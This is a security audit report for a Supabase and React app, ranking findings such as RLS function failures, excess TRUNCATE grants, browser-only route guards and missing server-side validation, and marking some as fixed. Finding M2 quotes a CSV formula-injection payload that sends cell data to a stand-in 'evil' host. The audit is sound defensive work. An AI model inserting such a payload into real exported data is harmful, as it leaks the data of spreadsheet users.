# Security Audit

Audited 2026-08-02 against the live Supabase project and a production build.
Findings are ordered by severity. Each was verified empirically, not inferred.

---

## Executive summary

The security model is **better than typical AI-generated output**. Roles live in a dedicated table
rather than in editable user metadata, RLS is enabled on every table, the privilege-escalation hole
in the original signup trigger was found and closed, and role-check functions were moved out of the
publicly callable `public` schema. No secrets leak to the client.

The dominant risk is not a missing control — it is that **RLS is the only control**. After Phase 0
that boundary is sound and verified: the broken `is_admin()` function is repaired, `anon` holds no
table privileges, and all three roles were confirmed correct over the live HTTP API. What remains
open is server-side *value* validation (H3) and the render-time route guards (H1).

---

> **Phase 0 status (2026-08-02):** C1, H2 and M4 are **resolved**. See `PHASE_0_REPORT.md` for the
> verification evidence. Findings are retained below with their status marked.

## CRITICAL

### ~~C1 — `private.is_admin()` raises `42883`; the entire admin surface is down~~ ✅ FIXED

`private.is_admin()` calls `public.has_role(...)`, which migration 4 moved to `private`. Its
`search_path` is pinned to `public`, so the call can never resolve.

Verified as `authenticated` with an admin JWT: `SELECT` on `profiles`, `INSERT` on `groups`,
`INSERT` on `subjects`, and `UPDATE` on `center_settings` **all fail** with
`ERROR 42883: function public.has_role(uuid, unknown) does not exist`.

This is simultaneously an outage and a security-relevant event: policies are failing *closed*
(deny) rather than open, so there is no data exposure — but it means the admin authorization path
has never actually been exercised in production, and no one will discover a policy mistake until
the function is repaired.

Fix in `DATABASE.md` §3. **Do this first** — several findings below cannot be tested until it lands.

---

## HIGH

### H1 — Authorization is enforced only in the browser at render time

All mutations go browser → Supabase. `RequireAuth` runs during React render, after the route's
JavaScript has already been fetched and executed.

The data itself is protected by RLS, so this is **not** a data-breach vector. The real consequences:
- Admin-only route code is downloaded by any authenticated user (information disclosure about
  internal structure, not data).
- A user who forges client state sees admin UI. Their writes fail at the database, but the
  application shows a broken, error-filled screen rather than a clean refusal.

Recommendation: move guards into TanStack Router `beforeLoad` so redirects happen before the route
module loads, and treat `RequireAuth` purely as a rendering convenience.

### ~~H2 — `anon` holds `TRUNCATE` on all 12 tables~~ ✅ FIXED

`anon` and `authenticated` have `TRUNCATE`, `REFERENCES`, and `TRIGGER` on every public table,
granted by a platform default rather than by any migration. RLS cannot filter `TRUNCATE`.

Verified mitigation: PostgREST exposes no `TRUNCATE` verb, and `anon` cannot execute any function
(all four checked). So there is **no reachable exploit path today**. Rated HIGH rather than
CRITICAL for that reason — but it is one misconfigured RPC away from total data loss, and should be
revoked now (SQL in `DATABASE.md` §5).

### H3 — No server-side validation on any mutation

Zod schemas exist for login and registration only. Every other write — group capacity, price,
schedule times, subject colour, centre settings — is validated in the browser or not at all.

RLS answers "may this user write this row?" but never "is this value sane?". A crafted request can
set `max_students = -5`, `price_dzd = -100000`, `end_time` before `start_time`, or a 10 MB string
in `subjects.name`. There are no CHECK constraints for these beyond `weekday BETWEEN 0 AND 6`.

Recommendation: add database CHECK constraints for the invariants (cheapest, cannot be bypassed),
and share the Zod schemas between form and any future server function.

---

## MEDIUM

### M1 — Teachers are routed into the admin Groups CRUD screen

`src/routes/dashboard.groups.tsx` guards with `roles={["admin", "teacher"]}`, but the sidebar marks
Groups as admin-only and RLS restricts `groups` writes to admins. There is **no in-component role
gating** — a teacher reaching `/dashboard/groups` sees create, edit, and delete controls whose
writes the database will reject.

Not a breach (RLS holds). It is a broken-experience and trust bug: the UI promises capability it
does not have.

### M2 — CSV export is vulnerable to formula injection

`src/lib/export-csv.ts` quotes and escapes correctly for CSV *parsing*, but a field beginning with
`=`, `+`, `-`, or `@` is interpreted as a formula by Excel and Sheets. A student named
`=HYPERLINK("http://evil/?"&A1,"click")` becomes a live formula in any exported roster.

Fix: prefix a single quote, or wrap values whose first character is in `=+-@`, before escaping.

### M3 — Session tokens in `localStorage`

`client.ts` sets `storage: localStorage`. Any successful XSS reads the refresh token and achieves
persistent account takeover. No XSS vector was found today (the single `dangerouslySetInnerHTML`
is stock shadcn chart code injecting developer-authored CSS variables, not user input), so this is
latent rather than active. Cookie-based storage with `httpOnly` would require the server-side
session layer that `auth-middleware.ts` already anticipates.

### ~~M4 — `.env` is committed and untracked by `.gitignore`~~ ✅ ADDRESSED

`.env` sits in the repo root and `.gitignore` does not exclude it. The three values it holds are
the Supabase URL, project ID, and the **publishable** (anon) key — all designed to be public, and
all already present in the client bundle by necessity. **Nothing sensitive is currently exposed.**

The risk is procedural: the file is the natural place someone will later paste
`SUPABASE_SERVICE_ROLE_KEY`, and it would be committed silently. Add `.env` to `.gitignore` and
ship a `.env.example`.

---

## LOW

### L1 — `signUp()` sends a client-chosen `role` that the database ignores

`supabase-auth-service.ts` passes `data: { full_name, role }` into user metadata. Migration 3 made
`handle_new_user()` hard-code `'student'`, so the value is discarded. Safe, but misleading — a
future maintainer could reasonably reintroduce trust in it. Remove the field.

### L2 — Error messages surface raw Postgres text to end users

Mutations do `toast.error(e.message)`, which today would render
`function public.has_role(uuid, unknown) does not exist` to a user. Minor information disclosure
and poor UX. Map database errors to friendly, translated messages.

### L3 — Password policy is 8 characters with no composition or breach check

`schemas.ts` enforces `min(8)` only. Supabase's own settings should also be reviewed for leaked-
password protection and rate limiting on the auth endpoints.

---

## Verified as *not* problems

Recording these so they are not re-litigated:

- **No secret in the client bundle.** `service_role` and `SERVICE_ROLE` appear zero times. The one
  `sb_secret_` hit is the literal inside `isNewSupabaseApiKey()`'s prefix comparison, confirmed by
  inspecting the surrounding bytes.
- **RLS is enabled on all 12 tables**, and every policy is scoped `TO authenticated`.
- **Role functions are not RPC-exposed.** `has_role` and `is_admin` live in `private`; `anon` holds
  no EXECUTE on any function.
- **Privilege escalation via signup is closed.** A student cannot self-assign a role: `user_roles`
  writes require `is_admin()`.
- **CSRF protection is active.** `start.ts` re-registers `createCsrfMiddleware` for server
  functions, correctly compensating for the fact that defining `start.ts` opts out of the automatic
  install.
- **The `dangerouslySetInnerHTML` in `ui/chart.tsx` is not an XSS vector** — it emits CSS custom
  properties from a developer-supplied config object. (The component is also entirely unused.)
- **SQL injection is not reachable** — all access goes through PostgREST's parameterized query
  builder; there is no raw SQL construction in application code.

---

## Priority order

1. **C1** — repair `private.is_admin()`. Nothing else can be validated until this is fixed.
2. **H2** — revoke `TRUNCATE`/`REFERENCES`/`TRIGGER` from `anon` and `authenticated`.
3. **H3** — add CHECK constraints for domain invariants.
4. **H1** — move route guards to `beforeLoad`.
5. **M1**, **M2**, **M4** — cheap, contained fixes.
6. **M3** — revisit alongside the server-side session layer.
